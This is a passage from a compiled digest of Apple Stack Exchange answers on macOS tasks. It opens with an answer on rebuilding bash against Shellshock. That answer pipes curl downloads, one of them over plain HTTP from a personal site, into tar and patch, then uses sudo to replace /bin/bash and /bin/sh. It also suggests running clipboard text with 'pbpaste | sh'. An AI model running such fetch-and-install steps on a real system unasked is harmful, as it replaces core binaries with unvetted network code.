Users should decide for themselves how important this is. I (@OldPro) think it is nothing to worry about because there is no known exploit for this behavior (it was not even given a CVE identifier) because in general unprivileged remote attackers cannot set the name of an environment variable and attackers with privileges cannot use this to gain privileges they do not already have (at least not without exploiting an additional vulnerabiltiy). 

To provide a little background, bash allows you to define functions, and furthermore allows you to export those functions to subshells via the export -f command. This used to be implemented by creating an environment variable with the same name as the function with its value set to the function definition. So

$ ls () { echo 'Game Over'; }
$ export -f ls
$ echo $ls
Game Over


This happened because export -f ls created an environment variable named ls. The "Game Over" vulnerability was that you could directly create this environment variable without having to first define the function, which meant if you could inject the right variable name you could hijack a command. Apple tried to fix this by making it hard to create a variable with the right name. The official bash patch 54 actually makes it impossible to create a variable with the right name by using variable names that include % which is a character not allowed in a variable name, effectively putting exported function definitions in a different, reserved namespace.

If none of the above makes sense to you, don't worry about it. You are fine with the Apple patch for now.

System Binaries

OS X 10.9.5 (the latest stable release at the moment) ships with Bash v3.2.51:

$ bash --version
GNU bash, version 3.2.51(1)-release (x86_64-apple-darwin13)
Copyright (C) 2007 Free Software Foundation, Inc.


You can obtain and recompile Bash as follows, providing that you have Xcode installed (and have run xcodebuild at least once before to accept the license):

$ # If you want to disable auto-imported functions, uncomment the following
$ # export ADD_IMPORT_FUNCTIONS_PATCH=YES
$ mkdir bash-fix
$ cd bash-fix
$ curl https://opensource.apple.com/tarballs/bash/bash-92.tar.gz | tar zxf -
$ cd bash-92/bash-3.2
$ curl https://ftp.gnu.org/pub/gnu/bash/bash-3.2-patches/bash32-052 | patch -p0    
$ curl https://ftp.gnu.org/pub/gnu/bash/bash-3.2-patches/bash32-053 | patch -p0  
$ # See note above about ADD_IMPORT_FUNCTIONS_PATCH
$ [ "$ADD_IMPORT_FUNCTIONS_PATCH" == "YES" ] &amp;&amp; curl http://alblue.bandlem.com/import_functions.patch | patch -p0
$ [ "$ADD_IMPORT_FUNCTIONS_PATCH" == "YES" ] || curl https://ftp.gnu.org/pub/gnu/bash/bash-3.2-patches/bash32-054 | patch -p0
$ [ "$ADD_IMPORT_FUNCTIONS_PATCH" == "YES" ] || curl https://ftp.gnu.org/pub/gnu/bash/bash-3.2-patches/bash32-055 | patch -p0
$ [ "$ADD_IMPORT_FUNCTIONS_PATCH" == "YES" ] || curl https://ftp.gnu.org/pub/gnu/bash/bash-3.2-patches/bash32-056 | patch -p0
$ [ "$ADD_IMPORT_FUNCTIONS_PATCH" == "YES" ] || curl https://ftp.gnu.org/pub/gnu/bash/bash-3.2-patches/bash32-057 | patch -p0
$ cd ..
$ # Note: DO NOT ADD SUDO TO XCODEBUILD HERE
$ xcodebuild
$ build/Release/bash --version # GNU bash, version 3.2.57-release
$ build/Release/sh --version   # GNU bash, version 3.2.57-release
$ sudo cp /bin/bash /bin/bash.old
$ sudo cp /bin/sh /bin/sh.old
$ sudo cp build/Release/bash /bin
$ sudo cp build/Release/sh /bin


(Note: you can run this by copy-and-pasting the above code block, going into Terminal and then running pbpaste | cut -c 2- | sh. Always take care when running random scripts from the internet though ...)

After this, the Bash version should be v3.2.57:

$ bash --version
GNU bash, version 3.2.57-release (x86_64-apple-darwin13)
Copyright (C) 2007 Free Software Foundation, Inc.


For security, and after testing, I recommend that you chmod -x the old versions to ensure they aren't re-used, or move them to a backup site.

$ sudo chmod a-x /bin/bash.old /bin/sh.old


Other answers have solutions for those using MacPorts or Homebrew; these don't fix the problem, they just install additional versions of Bash. Please see those answers if you want to upgrade those specifically.

Thanks

Thanks to Chet, who looks after bash, and has been making these patches available. Thanks to everyone else who has commented on this and improved it over time.

Now Apple has released the real fix, though this might still be useful. Because they only released a fix for Lion and up, and the official patch provides GNU bash, version 3.2.53(1)-release (x86_64-apple-darwin13), however, the Game over bug is still somewhat vulnerable. At this point, rebuilding your own version of Bash against 3.2.57 is probably more secure than relying on Apple's patch, unless you do it wrong.

---

#### 19. How to combine two images into one on a Mac?

**问题描述 / Problem Description**:
Tags: macos, software-recommendation, image-editing | Score: 365 | Views: 884013 | Answers: 19

**解决方案 / Solution**:
I often have to do this with images of plots of data.  I use the command line tools that come in the Imagemagick package; I think I installed it on my system with MacPorts. You could also choose to install with brew (brew install imagemagick).
The actual tool you want to use from Imagemagick is the convert tool.  If you have your two 320x428 images, say a.png and b.png, you can do
convert +append a.png b.png c.png

to create a new file, c.png, that has the a.png on the left and b.png on the right.  Alternatively, you append them vertically with -append (instead of +) and a.png will be on top of b.png.  With convert, you can do a ton of other things.  For example, you can switch to a different image format for the output
convert +append a.png b.jpg c.tif

This isn't a GUI application, but maybe some others might have a better solution.  Alternatively, you could put this in some sort of automator script.
2020-12-10：
I used it on 2020-12-10 and now the correct code is
convert +append a.png b.jpg +append c.tif

---

#### 20. How do I downgrade node or install a specific previous version using homebrew?

**问题描述 / Problem Description**:
Tags: macos, homebrew | Score: 362 | Views: 676196 | Answers: 13

**解决方案 / Solution**:
These days if you want to install a different version of node you do it this way:
First search for your desired package:
brew search node

This might give you the follow results:
heroku/brew/heroku-node ✔
node ✔
node@10
node_exporter
nodenv
libbitcoin-node
node-build
node@12 ✔
node@14 ✔
...

And then install the desired version:
brew install node@14

Also remember that you can install more than 1 node package at the same time, but you cannot have them available at the same time. So if you have the latest/generic node package already installed you need to unlink it first:
brew unlink node

And then you can link a different version:
brew link node@14

Sometimes it might be required to link them with the --force and --overwrite options:
brew link --force --overwrite node@14

However, when new node version comes out and you’ll update to it by running brew upgrade, the link will be removed and the most recent node version will be linked instead. To remedy that you might consider adding your desired node version to PATH instead (and restart the shell):
echo 'export PATH=&quot;/usr/local/opt/node@14/bin:$PATH&quot;' &gt;&gt; ~/.zshrc

(replace .zshrc with .bashrc or similar, depending on which $SHELL you use)

---

#### 21. How can I disable animation when switching desktops in Lion?

**问题描述 / Problem Description**:
Tags: macos, spaces | Score: 352 | Views: 135252 | Answers: 6

**解决方案 / Solution**:
I posted a bug on Radar#28495374 and here is the response from Apple:

Fixed in 10.12.  Go to Accessibility and Turn on Reduce Motion…
Please let us know whether the issue is resolved for you by updating your bug report.

---

#### 22. How to change computer name so terminal displays it in Mac OS X Mountain Lion?

**问题描述 / Problem Description**:
Tags: sharing, macos, hosts | Score: 326 | Views: 761810 | Answers: 8

**解决方案 / Solution**:
If you use:
sudo scutil --set HostName name-you-want

it will work a bit better. From the scutil(8) man page:

--get pref
    Retrieves the specified preference.  The current value will be
    reported on standard output.

    Supported preferences include:
          ComputerName   The user-friendly name for the system.
          LocalHostName  The local (Bonjour) host name.
          HostName       The name associated with hostname(1) and gethostname(3).

--set pref [newval]
    Updates the specified preference with the new value.  If the new value is not
    specified on the command line then it will be read from standard input.

    Supported preferences include: ComputerName LocalHostName HostName

    The --set option requires super-user access.

---

#### 23. Can I get the CPU temperature and fan speed from the command line in OS X?

**问题描述 / Problem Description**:
Tags: macos, temperature, command-line, monitoring | Score: 324 | Views: 574587 | Answers: 14

**解决方案 / Solution**:
Option #1) you may consider using inbuilt utility powermetrics to get the cpu and gpu temperature and lot more other details.
To get CPU temperature:
sudo powermetrics --samplers smc |grep -i &quot;CPU die temperature&quot;


To get GPU temperature:
sudo powermetrics --samplers smc |grep -i &quot;GPU die temperature&quot;

To get lot more details:
sudo powermetrics

This has been tested on macbook pro with macOS mojave.
Option #2)
Install Intel® Power Gadget officially provided by Intel from here
Intel® Power Gadget and then launch Intel Power Gadget from the launchpad.

Result Screen:

---

#### 24. Hotkey to show hidden files and folders in File Open dialog?

**问题描述 / Problem Description**:
Tags: macos | Score: 323 | Views: 200602 | Answers: 3

**解决方案 / Solution**:
⌘ CMD+⇧ SHIFT+. reveals hidden files in Finder and Open/Save dialogs.

If you are using an AZERTY keyboard, you'll need to press fn too, so ⇧ SHIFT is taken into consideration as you already need it to make the ..



You can also press ⌘ CMD+⇧ SHIFT+G and type the path to the hidden folder, just like in Terminal (⇥ TAB autocompletion also works).

Editing hidden files can be dangerous if you don't know what you're doing.

---

#### 25. How to create a text file in a folder

**问题描述 / Problem Description**:
Tags: macos, finder, file | Score: 321 | Views: 609446 | Answers: 32

**解决方案 / Solution**:
You can also do this in Terminal. Go to the directory where you want to create the file, then run the following:

touch file.txt


Or redirect 'nothing' to a text file

&gt; file.txt

---

#### 26. Applications Don&#39;t Show Up in Spotlight

**问题描述 / Problem Description**:
Tags: macos, spotlight | Score: 319 | Views: 141991 | Answers: 7

**解决方案 / Solution**:
Update Oct 1, 2021
In 10.12 (macOS Sierra) and newer, it appears to be enough to disable and reenable indexing:
sudo mdutil -a -i off
sudo mdutil -a -i on

Original Answer
Loading the metadata plist worked for me:
Turn off spotlight:
sudo mdutil -a -i off

Unload it:
sudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.metadata.mds.plist

Load It:
sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.metadata.mds.plist

Turn on spotlight again:
sudo mdutil -a -i on

Now everything is being reindexed as expected.

---

#### 27. What do I type to produce the command symbol (⌘) in Mac OS X?

**问题描述 / Problem Description**:
Tags: macos, internationalization, keyboard | Score: 303 | Views: 354805 | Answers: 17

**解决方案 / Solution**:
If you're just looking for the Unicode versions of Mac OS X keys, you can use this Apple support document to copy and paste them:

Mac keyboard shortcuts
https://support.apple.com/en-us/HT201236


⌘ Command (or Cmd)
⇧ Shift
⌥ Option (or Alt)
⌃ Control (or Ctrl)


More generally, Mac OS X provides a pane to insert special characters. You'll find it under Edit -&gt; Emoji and Symbols in any program that takes text input. The Command key symbol can be found by searching for it's name &quot;place of interest&quot;. To insert the character, double click it.


If you're really hardcore and are looking for a way to type the character by entering the Unicode hex code, this is possible:

Go into System Preferences -&gt; Keyboard -&gt; Input Sources, click &quot;+&quot;, scroll to &quot;others&quot;, select &quot;Unicode Hex Input&quot; and click &quot;Add&quot;


From the input source selector in the menu bar, select &quot;Unicode Hex Input&quot;


To enter a Unicode character, hold down option and type the 4-digit hex code for the character and it will be inserted. In this case, it would be option+2318.

---

#### 28. How to Retrieve the Wi-Fi Password of a Connected Network on a Mac

**问题描述 / Problem Description**:
Tags: macos, macbook-pro, mac | Score: 282 | Views: 1562491 | Answers: 5

**解决方案 / Solution**:
If the password is stored, you can find it using the program Keychain Access.

If you open /Applications/Utilities/Keychain Access, it will show you a list of stored entries. If you click the Kind column header, it will sort by kind, go to the section where AirPort network passwords are stored. On Yosemite, you may have to select "Local Items" rather than "login" under Keychains in the upper left.

Double-click the name of the network you are using (if you don't know the name of the network, you can find it in the WiFi menulet (the concentric quarter circles toward the right side of your menu bar).



Check the Show password box, enter your system password, and click the Allow button.

That should show you the password for the wireless network you are on, if it is stored on your computer. If no such entry appears, it means the password is not stored on your computer.

Note that you can also use this technique to find saved passwords for websites or other passwords that you computer has stored but you have forgotten.

---

#### 29. &quot;File Open&quot; dialog is missing sidebar items

**问题描述 / Problem Description**:
Tags: finder, macos, sidebar | Score: 280 | Views: 132876 | Answers: 7

**解决方案 / Solution**:
Go to your user library in Finder. Hold down ⌥ while opening the Go menu and click Library. 
Navigate to the Preferences folder.
Remove any files that are or contain com.apple.finder.plist. (The removal of those files will very likely reset your Favourites list in Finder.)
Restart or log out and log back in again then empty the trash and try again. 

Restarting might not be necessary. As madpoet says:


  You can also relaunch Finder if you don't want to reboot or log out. Right click on Finder icon while you're pressing ⌥ and you'll see the Relaunch option there.
  
  





Alternatively, you can use this Bash oneliner by Christophe Marois:

cd ~/Library/Preferences &amp;&amp; sudo find com.apple.finder.plist* -exec rm {} \; &amp;&amp; killall Finder

---

#### 30. Where can I find the installed package path via brew

**问题描述 / Problem Description**:
Tags: macos, homebrew | Score: 279 | Views: 651613 | Answers: 15

**解决方案 / Solution**:
Use the following to show the installation path of a package:

brew info hping


Example output:

pcre: stable 8.35 (bottled)
http://www.pcre.org/
/usr/local/Cellar/pcre/8.35 (146 files, 5.8M) *
  Poured from bottle
From: https://github.com/Homebrew/homebrew/blob/master/Library/Formula/pcre.rb
==&gt; Options
--universal
    Build a universal binary

---

#### 31. How to replace Mac OS X utilities with GNU core utilities?

**问题描述 / Problem Description**:
Tags: macos, command-line, unix, utilities | Score: 278 | Views: 215462 | Answers: 7

**解决方案 / Solution**:
This adds symlinks for GNU utilities with g prefix to /usr/local/bin/:

brew install coreutils findutils gnu-tar gnu-sed gawk gnutls gnu-indent gnu-getopt grep


See brew search gnu for other packages. If you want to use the commands without a g prefix add for example /usr/local/opt/coreutils/libexec/gnubin before other directories on your PATH.

$ brew info coreutils
coreutils: stable 8.21
http://www.gnu.org/software/coreutils
Depends on: xz
/usr/local/Cellar/coreutils/8.20 (208 files, 9.4M)
/usr/local/Cellar/coreutils/8.21 (210 files, 9.6M) *
https://github.com/mxcl/homebrew/commits/master/Library/Formula/coreutils.rb
==&gt; Caveats
All commands have been installed with the prefix 'g'.

If you really need to use these commands with their normal names, you
can add a "gnubin" directory to your PATH from your bashrc like:

    PATH="/usr/local/opt/coreutils/libexec/gnubin:$PATH"

Additionally, you can access their man pages with normal names if you add
the "gnuman" directory to your MANPATH from your bashrc as well:

    MANPATH="/usr/local/opt/coreutils/libexec/gnuman:$MANPATH"

---

#### 32. Why are dot underscore ._ files created, and how can I avoid them?

**问题描述 / Problem Description**:
Tags: macos, file | Score: 275 | Views: 394181 | Answers: 14

**解决方案 / Solution**:
You can't avoid them (but see the dot_clean answer by Saeid Zebardast --they can be removed from a directory if that is what you need).  They're created to store file information that would otherwise go into an extended attribute on HFS+ (Apple native) or Unix/UFS volumes; in earlier Mac OS this would be the resource fork.  Finder file operations will create them automatically to store the icon information, plus Time Machine stores some information in them so if you copy a file backed up via TM it will have that information copied as well.

(This is nothing new; I've noticed that XP and later leave various turds around as well, although not quite as many.)

---

#### 33. Can I open files in TextEdit from the Terminal in Mac OS X?

**问题描述 / Problem Description**:
Tags: macos, command-line, terminal, textedit | Score: 273 | Views: 538174 | Answers: 5

**解决方案 / Solution**:
open -a TextEdit filename should do the trick.
The -a flag specifies any application you want, so it's applicable to any number of situations, including ones where TextEdit isn't the default editor.
Other relevant options

-t  opens in the default editor (i.e. if you use BBEdit, TextMate, etc.)
-e will open the file specifically in TextEdit

---

#### 34. Can Touch ID on Mac authenticate sudo in Terminal?

**问题描述 / Problem Description**:
Tags: macos, mac, password, sudo, touch-id | Score: 272 | Views: 118530 | Answers: 14

**解决方案 / Solution**:
To allow TouchID on your Mac to authenticate you for sudo access instead of a password you need to do the following.

Open Terminal

Switch to the root user with sudo su -

Edit the /etc/pam.d/sudo file with a command-line editor such as vim or nano

The contents of this file should look like one of the following examples:


# sudo: auth account password session
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so



# sudo: auth account password session
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so




You need to add an additional auth line to the top so it now looks like this:
# sudo: auth account password session
auth       sufficient     pam_tid.so
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so


Save the file. (Note: this file is normally read-only so saving your changes may require you to force the save, e.g. vim will require you to use wq! when saving)

Also note that pam_smartcard.so may not be present on older MacOS versions.

Exit from the root user or start a new terminal session.

Try to use sudo, and you should be prompted to authenticate with TouchID as shown below.


If you click 'Cancel,' you can just enter your password at the terminal prompt. If you click 'Use Password' you can enter your password in the dialog box.

If you SSH into your machine it will fall back to just use your password, since you can't send your TouchID fingerprints over SSH.


Note:
See answer by user Pierz below if you're using iTerm, as there's a setting you need to explicitly change to enable this feature.
Note:
Recent MacOS updates may remove the entry. If TouchID stops working for sudo then check if the entry was removed and add it back in, following these instructions again.

---

#### 35. How can I manually delete old backups to free space for Time Machine?

**问题描述 / Problem Description**:
Tags: macos, time-machine, backup, time-capsule, maintenance | Score: 266 | Views: 754833 | Answers: 8

**解决方案 / Solution**:
Be careful with sudo and making sure you pick the correct Mac's files since there is no undo or confirmation of the following command:
sudo tmutil delete /Volumes/drive_name/Backups.backupdb/old_mac_name

The sudo command needs your password (and it won't echo to the screen, so just type it and pause to be sure you're dating the correct files before pressing enter). If you want to be safer, you can pick one snapshot to delete first to be sure the command works as intended. This is nice since it could take hours to clean up some larger backup sets and you want to leave the Mac confident it's deleting the correct information store.
You can use the tmutil tool to delete backups one by one.
sudo tmutil delete /Volumes/drive_name/Backups.backupdb/mac_name/YYYY-MM-DD-hhmmss

Since tmutil was introduced with Lion, this will not work on earlier OS versions.
If you want to get the current directory of backups (there can be multiple destinations defined and only one will be &quot;current&quot;)
sudo tmutil machinedirectory

If you back up to a network share, you may have sparse bundle storage and if so, that needs to be compacted as well.
sudo hdiutil compact /Volumes/drive_name/Backups.backupdb/mac_name.sparsebundle

---

#### 36. What is the &quot;rootless&quot; feature in El Capitan, really?

**问题描述 / Problem Description**:
Tags: macos, unix, root, sip | Score: 265 | Views: 186444 | Answers: 3

**解决方案 / Solution**:
First: the name &quot;rootless&quot; is misleading, since there's still a root account, and you can still access it (the official name, &quot;System Integrity Protection&quot;, is more accurate). What it really does is limit the power of the root account, so that even if you become root, you don't have full control over the system. Essentially, the idea is that it's too easy for malware to get root access (e.g. by presenting an auth dialog to the user, which will cause the user to reflexively enter the admin password). SIP adds another layer of protection, which malware can't penetrate even if it gets root. The bad part of this, of course, it that it must also apply to things you're doing intentionally. But the restrictions it places on root aren't that bad; they don't prevent most &quot;normal&quot; system customization.
Here's what it restricts, even from root:

You can't modify anything in /System, /bin, /sbin, or /usr (except /usr/local); or any of the built-in apps and utilities. Only Installer and software update can modify these areas, and even they only do it when installing Apple-signed packages. But since normal OS X-style customizations go in /Library (or ~/Library, or /Applications), and unix-style customizations (e.g. Homebrew) go in /usr/local (or sometimes /etc or /opt), this shouldn't be a big deal. It also prevents block-level writes to the startup disk, so you can't bypass it that way.
The full list of restricted directories (and exceptions like /usr/local and a few others) is in /System/Library/Sandbox/rootless.conf. Of course, this file is itself in a restricted area.
When you upgrade to El Capitan, it moves any &quot;unauthorized&quot; files from restricted areas to /Library/SystemMigration/History/Migration-(some UUID)/QuarantineRoot/.

You can't attach to system processes (e.g. those running from those system locations) for things like debugging (or changing what dynamic libraries they load, or some other things). Again, not too much of a big deal; developers can still debug their own programs.
This does block some significant things like injecting code into the built-in Apple apps (notably the Finder). It also means that dtrace-based tools for system monitoring (e.g. opensnoop) will not be able to monitor &amp; report on many system processes.

You can't load kernel extensions (kexts) unless they're properly signed (i.e. by Apple or an Apple-approved developer). Note that this replaces the old system for enforcing kext signing (and the old ways of bypassing it). But since v10.10.4 Apple has had a way to enable trim support for third-party SSDs, the #1 reason to use unsigned kexts has gone away.

Starting in Sierra (10.12), some launchd configuration settings cannot be changed (for example, some launch daemons cannot be unloaded).

Starting in Mojave (10.14), access to users' personal information (email, contacts, etc) is restricted to apps that the user has approved to access that info. This is generally considered a separate feature (called Personal Information Protection, or TCC), but it's based on SIP and disabling SIP disables it as well. See: &quot;What and how does macOS Mojave implement to restrict applications access to personal data?&quot;

Starting in Catalina (10.15), protection of most system files is strengthened by storing them on a separate read-only volume. This is not strictly part of SIP, and is not disabled by disabling SIP. See: WWDC presentation on &quot;What's New in Apple [Catalina] File Systems&quot; and &quot;What's /System/Volumes/Data?&quot;.

Starting in Big Sur (11.x), the read-only system volume is now a &quot;Sealed System Volume&quot; (a mounted snapshot rather than a regular volume), so making changes to it is even more complicated. See: the Eclectic Light Company article &quot;Big Sur boot volume layout&quot;.


If you don't want these restrictions -- either because you want to modify your system beyond what this allows, or because you're developing &amp; debugging something like kexts that aren't practical under these restrictions, you can turn SIP off. Currently this requires rebooting into recovery mode and running the command csrutil disable (and you can similarly re-enable it with csrutil enable).
Modifying the system volume in Catalina requires disabling SIP, then mounting the volume with write access (and then rebooting and turning SIP back on is recommended). In Big Sur, additional steps are required to disable authentication of the system volume before changes, and afterward create a new snapshot.
You can also selectively disable parts of SIP. For example, csrutil enable --without kext will disable SIP's kernel extension restriction, but leave its other protections in place.
But please stop and think before disabling SIP, even temporarily or partially: do you really need to disable it, or is there a better (SIP-compliant) way to do what you want? Do you really need to modify something in /System/Library or /bin or whatever, or could it go in a better place like /Library or /usr/local/bin etc? SIP may &quot;feel&quot; constraining if you aren't used to it, and there are some legitimate reasons to disable it, but a lot of what it enforces it really just best practice anyway.
To underscore the importance of leaving as much of SIP enabled as much of the time as possible, consider the events of September 23, 2019. Google released an update to Chrome that tried to replace the symbolic link from /var to /private/var. On most systems, SIP blocked this and there were no bad effects. On systems with SIP disabled, it rendered macOS broken and unbootable. The most common reason for disabling SIP was to load unapproved (/improperly signed) kernel extensions (specifically video drivers); if they'd only disabled the kext restriction, they would not have been affected. See the official Google support thread, a superuser Q&amp;A on it, and an Ars Technica article.
References and further info: WWDC presentation on &quot;Security and Your Apps&quot;, a good explanation by Eldad Eilam on quora.com, the Ars Technica review of El Capitan, and an Apple support article on SIP, and a deep dive by Rich Trouton (who also posted an answer to this question).

---

#### 37. How can I make Safari show the URL when I hover over a link?

**问题描述 / Problem Description**:
Tags: macos, safari | Score: 261 | Views: 126089 | Answers: 3

**解决方案 / Solution**:
There are two options. One is a setting, and the other is a workaround.

Here are instructions on how to toggle the setting using the Menu Bar:


Go into the View menu.
Select "Show status bar".
Now, there will be a URL that pops up when you hover over a link, and also tells you if it's going to be in a new tab:




You can also press ⌘ + / to toggle this setting at ease.

The second option is a workaround for when you drag links. Here's how to get this feature to appear:


Click and drag the link out of where it will originally appear.
At your mouse will be a small box telling you the title of the new window and its URL, although it may be shortened.
You can also drag the link to the plus sign in your tab list, out of the window, or in a folder/the desktop to open that URL in a new tab, new window or save it to your computer, respectively.

---

#### 38. Is there a keyboard shortcut to move a window from one monitor to another?

**问题描述 / Problem Description**:
Tags: macos, keyboard, display, window-manager | Score: 258 | Views: 419833 | Answers: 18

**解决方案 / Solution**:
There is yet another option that's completely free and requires no third-party app. Be aware that I've only tested this on MacOS latest version Catalina (as of now). For other OS versions see Create keyboard shortcuts for apps on Mac

Go to System Preferences
Select Keyboard and then the Shortcuts tab
Then on the list that appears select App Shortcuts
Add new shortcuts like this:

Click on the plus sign to add a new one, the Menu Title field has to match exactly the text that appears on the Window menu in every application: &quot;Move to DISPLAY NAME&quot; (To find the text just open the Window menu on any application)
Finally on the Keyboard Shortcut field enter the shortcut you'd like to use
Add as many shortcuts as you need to move any window between your displays!

---

#### 39. Make the green full screen window icon on Yosemite maximize windows

**问题描述 / Problem Description**:
Tags: macos, fullscreen | Score: 249 | Views: 136963 | Answers: 7

**解决方案 / Solution**:
As the below mentioned solution is application-based (i.e. only works for apps like Google Chrome), another way to approach this problem is to ignore the maximize button entirely and to install the open source app spectacle which offers the keyboard shortcut:

⌘ + ⌥ + F

It also has some other nice features, too. And it works for all apps.



In order to maximize the window so that it fills the visible window content, use:

⌥ + Click on green icon

In order to maximize the window both in width and height to the current desktop for applications like Google Chrome use:

⌥ + ⇧ + Click on green icon

You notice the change of behaviour of the button in the way it changes its content from two the arrows to a plus sign.

---

#### 40. macOS Sierra doesn’t seem to remember SSH keys between reboots

**问题描述 / Problem Description**:
Tags: terminal, password, ssh, macos | Score: 230 | Views: 175526 | Answers: 11

**解决方案 / Solution**:
As of macOS Sierra 10.12.2 Apple added an ssh_config option called UseKeychain which allows a 'proper' resolution to the problem. Add the following to your ~/.ssh/config file:
Host *
   AddKeysToAgent yes
   UseKeychain yes     

From the ssh_config man page on 10.12.2:

UseKeychain
On macOS, specifies whether the system should search for passphrases in the user's keychain when attempting to use a particular key. When the passphrase is provided by the user, this option also specifies whether the passphrase should be stored into the keychain once it has been verified to be correct.  The argument must be 'yes' or 'no'.  The default is 'no'.

---

#### 41. How can I rename Desktops / Spaces in macOS?

**问题描述 / Problem Description**:
Tags: macos, high-sierra, spaces | Score: 229 | Views: 262531 | Answers: 21

**解决方案 / Solution**:
Refer to the original page for detailed solutions and community answers.

---

#### 42. Keyboard shortcut for restoring applications from the Mac OS X Dock?

**问题描述 / Problem Description**:
Tags: macos, keyboard | Score: 225 | Views: 117988 | Answers: 11

**解决方案 / Solution**:
Command + Tab until you get the app's icon.
Before releasing the Command key, press and hold the Option key.





You must switch to another app and let it take focus first. In other words, you can't just Command + Tab to another app and before actually selecting that app (by releasing the Command and Tab keys), switch right back to your minimized app, which you might attempt to do if you minimized it by accident or just simply changed your mind shortly after minimizing.
Both the Command and left Option keys must be pressed on the same side (left or right) of the keyboard.

---

#### 43. How do I run a .sh or .command file in Terminal

**问题描述 / Problem Description**:
Tags: macos, terminal, command-line, bash | Score: 224 | Views: 1264163 | Answers: 6

**解决方案 / Solution**:
Open Terminal, type in sh /path/to/file and press enter. 

Faster is to type sh and a space and then drag the file to the window and release the icon anywhere on the window.

---

#### 44. How do I combine two or more images to get a single pdf file?

**问题描述 / Problem Description**:
Tags: pdf, graphics, macos | Score: 222 | Views: 1502201 | Answers: 8

**解决方案 / Solution**:
Here are the steps to save multiple images in Preview into a single multi-page PDF.

Select all of the images you want in your PDF, right-click and choose open with Preview

In Preview's Sidebar drag the images into the order you want them to appear in your PDF

Select/highlight all the images to be included in the PDF document; otherwise only a single image may end up the PDF document

Then from the &quot;File&quot; menu choose &quot;Export Selected Images&quot; (or &quot;Export as PDF...&quot; in recent OS X versions) and then &quot;PDF &gt; Save as PDF&quot;

---

#### 45. Suppressing &quot;The default interactive shell is now zsh&quot; message in macOS Catalina

**问题描述 / Problem Description**:
Tags: terminal, command-line, macos, bash | Score: 216 | Views: 100043 | Answers: 5

**解决方案 / Solution**:
I found the solution on reddit. The solution is also mentioned in the &quot;How to use a different shell without changing the default&quot; section of the Apple support article mentioned in the bash warning: https://support.apple.com/en-us/HT208050/.
Add:
export BASH_SILENCE_DEPRECATION_WARNING=1

to $HOME/.bash_profile, $HOME/.profile or $HOME/.bashrc and restart iTerm. After that, the warning message will be gone.

---

#### 46. I included emoji in my password and now I can&#39;t log in to my Account on Yosemite

**问题描述 / Problem Description**:
Tags: macos, keyboard, password, filevault, emoji | Score: 213 | Views: 96836 | Answers: 8

**解决方案 / Solution**:
If you have "Other Input Sources" available at the top right of your login screen, select the one called Unicode Hex Input.  This can be used to input emoji (or any other character) into the password field, as long as you know the Unicode Hex number of the character.  This number can be found in the Character Viewer or on the internet.

Some items you find in the  "emoji" category have Unicode hex numbers with just 4 characters, such as Airplane U+2708 ✈.  With the Unicode Hex Input keyboard, you input this by holding down the Option key while you type 2708.  

Other emoji have Unicode hex numbers with 5 characters, such as Grinning Face U+1F600 😀.  For these you need to find the two corresponding UTF-16 Hex codes (sometimes called "surrogates") by consulting Character Viewer or using an internet source like fileformat.info.  For 1F600 these are D83D and DE00.  You can input 1F600 by holding down the option key while typing D83DDE00.  You may see two dots in the field, but it is still just one character.

---

#### 47. List USB devices on OSX command line

**问题描述 / Problem Description**:
Tags: macos, usb | Score: 212 | Views: 565190 | Answers: 2

**解决方案 / Solution**:
In addition to system_profiler SPUSBDataType (suggested by @kjs), you can also use ioreg -p IOUSB:

$ ioreg -p IOUSB 
+-o Root  &lt;class IORegistryEntry, id 0x100000100, retain 10&gt;
  +-o EHCI Root Hub Simulation@1A,7  &lt;class IOUSBRootHubDevice, id 0x100000227,$
  | +-o HubDevice@fa100000  &lt;class IOUSBHubDevice, id 0x10000027a, registered, $
  | | +-o Apple Internal Keyboard / Trackpad@fa120000  &lt;class IOUSBDevice, id 0$
  | | +-o BRCM2070 Hub@fa110000  &lt;class IOUSBHubDevice, id 0x1000002b4, registe$
  | |   +-o Bluetooth USB Host Controller@fa113000  &lt;class IOUSBDevice, id 0x10$
  | +-o FaceTime HD Camera (Built-in)@fa200000  &lt;class IOUSBDevice, id 0x100000$
  +-o EHCI Root Hub Simulation@1D,7  &lt;class IOUSBRootHubDevice, id 0x100000228,$
    +-o HubDevice@fd100000  &lt;class IOUSBHubDevice, id 0x10000027b, registered, $
      +-o IR Receiver@fd110000  &lt;class IOUSBDevice, id 0x100000288, registered,$


By default it clips to the window's width (80 chars in the example above), so you may want to add -w0 to get a full-width display. Also, adding -l will show details (probably more than you need) about each of the devices:

$ ioreg -p IOUSB -w0 -l
    +-o Root  &lt;class IORegistryEntry, id 0x100000100, retain 10&gt;
  | {
  |   "IOKitBuildVersion" = "Darwin Kernel Version 14.0.0: Fri Sep 19 00:26:44 PDT 2014; root:xnu-2782.1.97~2/RELEASE_X86_64"
  |   "OS Build Version" = "14B25"
  |   "OSKernelCPUSubtype" = 3
  |   "OSKernelCPUType" = 16777223
  |   "OSPrelinkKextCount" = 185
  |   "IOConsoleLocked" = No
  |   "IORegistryPlanes" = {"IOACPIPlane"="IOACPIPlane","IOPower"="IOPower","IODeviceTree"="IODeviceTree","IOService"="IOService","IOUSB"="IOUSB","IOFireWire"="IOFireWire"}
[...etc...]


[EDIT]: If you just want the device names, you can filter the basic list to trim the junk:

$ ioreg -p IOUSB -w0 | sed 's/[^o]*o //; s/@.*$//' | grep -v '^Root.*'
EHCI Root Hub Simulation
HubDevice
Apple Internal Keyboard / Trackpad
BRCM2070 Hub
Bluetooth USB Host Controller
FaceTime HD Camera (Built-in)
EHCI Root Hub Simulation
HubDevice
IR Receiver

---

#### 48. Why is it not possible to use the &quot;cut&quot; command to manipulate a file in the Finder?

**问题描述 / Problem Description**:
Tags: macos, finder, switching, contextual-menu | Score: 212 | Views: 200052 | Answers: 12

**解决方案 / Solution**:
Keyboard method: Cmd-C then Opt-Cmd-V does the cut&amp;paste for files on Mac. 

Mouse method: Drag the file from one folder to the parent of the target folder (ie, if moving to Documents:Financial, drag to Documents). Hover on the parent folder for a few seconds, and it will spring open. Then you can continue dragging the file to the target folder. (note, the mouse method may result in very long hover times, if you're dragging a huge number of files, eg 1,000 files)

